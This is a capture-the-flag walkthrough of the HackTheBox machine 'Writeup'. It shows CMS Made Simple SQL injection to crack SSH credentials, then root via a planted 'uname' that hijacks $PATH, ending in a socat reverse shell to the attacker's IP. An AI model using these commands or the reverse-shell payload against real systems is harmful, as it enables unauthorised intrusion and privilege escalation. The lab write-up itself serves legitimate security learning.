---
layout:     post
title:      Writeup (HTB)
date:       2019-10-12 12:00:00
summary:    Writeup of HackTheBox's Writeup.
categories: writeup
thumbnail: pencil
tags:
 - hackthebox
 - writeup
 - walkthrough

---

![](/images/writeup/infocard.png)

Ready for the writeup I wrote up of Writeup? This is the most meta box I've seen; the web server has walkthroughs of other HackTheBox machines, even an "early draft" of a walkthrough of itself. Although initial access is a standard "identify CMS, look up CVE" process, privilege escalation is a fun lesson on $PATH priority.

# Initial scan

{% highlight plaintext %}
root@kali:~# nmap 10.10.10.138 -sC -sV -oA writeup.nmap
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-30 18:12 EDT
Nmap scan report for 10.10.10.138
Host is up (0.062s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.04 seconds
{% endhighlight %}

Only SSH and HTTP are open. Let's see what the web server has in store for us.

# Enumerating the web server

At http://10.10.10.138, I find a message about some DoS protection installed on the server.

![](/images/writeup/image1.png)

Any of my attempts to brute-force directories is foiled by this DoS protection. Luckily, the nmap output shows that `robots.txt` has one disallowed entry: __/writeup/__

{% highlight plaintext %}
| http-robots.txt: 1 disallowed entry 
|_/writeup/
{% endhighlight %}

At the /writeup/ page, I find a page with links to three HackTheBox walk-throughs.

![](/images/writeup/image3.png)

(Yes, I really did think I could find the solution to Writeup in the "writeup" link . . . )

The bottom of the page mentions that the site was not made with `vim`.

![](/images/writeup/image4.png)

I take this as a hint to dig into what the site was actually built with. If you look at the source code, you'll see that this page was created using "CMS Made Simple."

{% highlight html %}
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
{% endhighlight %}

The copyright ends at 2019, so I can assume that the CMS is updated to at least the 2019 version as well. I google for __"CMS Made Simple 2019 exploit"__—and one of the first results is an [unauthenticated SQL injection exploit](https://www.exploit-db.com/exploits/46635) on the Exploit Database.

# SQL injection exploit

The script enumerates the site for a username and password hash using blind time-based SQL injection. Once the script pulls the hash, it proceeds to crack that hash with the wordlist you've passed in the command. rockyou does the trick.

{% highlight plaintext %}
root@kali:~# python exploit.py -u http://10.10.10.138/writeup --crack -w /usr/share/wordlists/rockyou.txt
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9
{% endhighlight %}

The uncovered credentials __(jkr:raykayjay9)__ can be used to SSH into the box.

{% highlight plaintext %}
root@kali:~# ssh jkr@10.10.10.138
The authenticity of host '10.10.10.138 (10.10.10.138)' can't be established.
ECDSA key fingerprint is SHA256:TEw8ogmentaVUz08dLoHLKmD7USL1uIqidsdoX77oy0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.138' (ECDSA) to the list of known hosts.
jkr@10.10.10.138's password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jkr@writeup:~$ 
{% endhighlight %}

The user flag is in jkr's home directory.

{% highlight plaintext %}
jkr@writeup:~$ cat user.txt
d4e4############################
{% endhighlight %}

# Privilege escalation: Abusing $PATH

This is tough to find if you're all alone on the box (i.e., VIP users are practically on Expert mode here), but if you run `pspy64` to snoop on processes _while_ a user is SSH'ing into the box, you'll see some interesting commands running as root (indicated by UID=0).

{% highlight plaintext %}
2019/09/30 19:59:33 CMD: UID=0    PID=6739   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2019/09/30 19:59:33 CMD: UID=0    PID=6740   | run-parts --lsbsysinit /etc/update-motd.d 
2019/09/30 19:59:33 CMD: UID=0    PID=6741   | uname -rnsom 
2019/09/30 19:59:33 CMD: UID=0    PID=6742   | sshd: jkr [priv]  
{% endhighlight %}

In the first line here, we see the value of the $PATH variable. To get root on this box, you have to understand the importance of $PATH.

When a user runs a binary without a full path—for example, `ifconfig` instead of `/sbin/ifconfig`—the shell looks at the leftmost directory in $PATH for an executable called `ifconfig` and runs that. If `ifconfig` can't be found there, the shell checks next directory in the $PATH vairable, and if it fails again, the next directory, etc.

Based on the third line of the `pspy64` output above, we know root runs `uname` _without the full path_ every time a user SSH's into the box. __So if we can create our own `uname` binary and place it earlier in $PATH, we can trigger root to execute the command by simply SSH'ing into the box.__ But first, I need to verify a couple of things, such as: Where even is the `uname` binary located?

{% highlight plaintext %}
jkr@writeup:~$ whereis uname
uname: /bin/uname /usr/share/man/man1/uname.1.gz
{% endhighlight %}

It's in /bin, which is the rightmost directory in $PATH. So if we drop our custom `uname` binary in any other directory in $PATH, that binary will execute instead of the /bin/uname binary. We need write access to this directory though, so I check to see what privileges I have over /usr/local/sbin.

{% highlight plaintext %}
jkr@writeup:~$ ls -alt /usr/local
total 64
drwx-wsr-x  2 root staff 12288 Sep 30 20:33 sbin
drwxrwsr-x  4 root staff  4096 Apr 24 13:13 lib
drwxrwsr-x  7 root staff  4096 Apr 19 04:30 share
drwxrwsr-x 10 root staff  4096 Apr 19 04:11 .
lrwxrwxrwx  1 root staff     9 Apr 19 04:11 man -> share/man
drwx-wsr-x  2 root staff 20480 Apr 19 04:11 bin
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 etc
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 src
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 include
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 games
drwxr-xr-x 10 root root   4096 Apr 19 04:11 ..
{% endhighlight %}

Anyone in the __staff__ group can write to the /usr/local/sbin directory. I run `id` to see if jkr is part of this group.

{% highlight plaintext %}
jkr@writeup:~$ id
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
{% endhighlight %}

So we should be good! I move to /usr/local/sbin and create the new `uname` file with `vi`. My script (below) simply grabs the root flag, moves it to the /tmp folder, and grants everyone read/write/execute permissions over it.

{% highlight bash %}
#!/bin/bash
cp /root/root.txt /tmp
chmod 777 /tmp/root.txt
{% endhighlight %}

I make my file executable.

{% highlight plaintext %}
jkr@writeup:/usr/local/sbin$ chmod +x uname
{% endhighlight %}

Now all that's left is triggering root's execution of `uname`. To do this, I exit my SSH session and initiate a new one.

{% highlight plaintext %}
jkr@writeup:/usr/local/sbin$ exit
logout
Connection to 10.10.10.138 closed.
root@kali:~# ssh jkr@10.10.10.138
jkr@10.10.10.138's password: 

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 30 20:27:06 2019 from 10.10.14.31
jkr@writeup:~$ 
{% endhighlight %}

I check the /tmp folder, and the root flag is there.

{% highlight plaintext %}
jkr@writeup:~$ cat /tmp/root.txt
eeba############################
{% endhighlight %}

# Bonus: Root shell

To get a root shell, just turn the `uname` binary into a reverse shell payload. The only roadblock is that `netcat` and `ncat` aren't on the machine.

{% highlight plaintext %}
jkr@writeup:~$ whereis nc
nc:
jkr@writeup:~$ whereis netcat
netcat:
jkr@writeup:~$ whereis ncat
ncat:
{% endhighlight %}

I _could_ download the netcat binary from my Kali box, but it's quieter to live off the land and use tools already provided on the box. `socat` works as a solid alternative.

{% highlight plaintext %}
jkr@writeup:~$ whereis socat
socat: /usr/bin/socat /usr/share/man/man1/socat.1.gz
{% endhighlight %}

I use `vi` to create a new `uname` binary that initiates a socat reverse shell. Here's the script:

{% highlight bash %}
#!/bin/bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.31:443
{% endhighlight %}

I make it executable as well.

{% highlight plaintext %}
jkr@writeup:/usr/local/sbin$ chmod +x uname
{% endhighlight %}

Before triggering the command, I set up a socat listener on my Kali's port 443.

{% highlight plaintext %}
root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:443
{% endhighlight %}

I exit and re-enter the SSH session to trigger the `uname` command.

{% highlight plaintext %}
jkr@writeup:/usr/local/sbin$ exit
logout
Connection to 10.10.10.138 closed.
root@kali:~# ssh jkr@10.10.10.138                                                                                                                                                              
jkr@10.10.10.138's password:
{% endhighlight %}

And my listener has a root shell.

{% highlight plaintext %}
root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:443
root@writeup:/# whoami
root
{% endhighlight %}